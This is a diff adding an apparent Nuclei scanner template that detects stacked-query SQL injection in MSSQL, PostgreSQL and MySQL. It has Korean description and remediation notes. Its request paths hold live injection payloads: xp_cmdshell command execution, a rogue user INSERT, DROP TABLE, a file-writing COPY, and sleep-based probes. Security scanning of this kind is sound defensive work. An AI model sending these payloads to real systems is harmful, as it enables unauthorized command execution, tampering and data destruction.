@@ -1,0 +1,47 @@
+id: sqli-stacked-queries
+
+info:
+  name: SQL Injection via Stacked Queries (Multiple Statements)
+  author: security-researcher
+  severity: critical
+  description: |
+    세미콜론(;)을 이용한 다중 쿼리 실행(Stacked Queries) SQL 인젝션을 탐지합니다.
+    MSSQL, PostgreSQL에서 주로 가능하며 DDL/DML 명령 실행이 가능합니다.
+  tags: sqli,stacked-queries,multi-statement,injection
+  remediation: |
+    - Prepared Statement 사용
+    - 다중 쿼리 실행 비활성화 (PDO: PDO::MYSQL_ATTR_MULTI_STATEMENTS)
+    - 데이터베이스 사용자 권한 최소화
+
+http:
+  - method: GET
+    path:
+      # MSSQL
+      - "{{BaseURL}}?id=1; SELECT @@version--"
+      - "{{BaseURL}}?id=1; WAITFOR DELAY '0:0:5'--"
+      - "{{BaseURL}}?id=1'; EXEC xp_cmdshell('whoami')--"
+      - "{{BaseURL}}?id=1; INSERT INTO users VALUES('hacked','hacked')--"
+      # PostgreSQL
+      - "{{BaseURL}}?id=1; SELECT pg_sleep(5)--"
+      - "{{BaseURL}}?id=1; COPY (SELECT 1) TO '/tmp/test'--"
+      # MySQL (일부 드라이버에서 가능)
+      - "{{BaseURL}}?id=1; SELECT SLEEP(5)#"
+      - "{{BaseURL}}?id=1; DROP TABLE IF EXISTS sqli_test--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "Incorrect syntax near"
+          - "ORA-\\d{5}"
+          - "PostgreSQL.*ERROR"
+          - "Microsoft SQL Server"
+          - "sql.*error"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
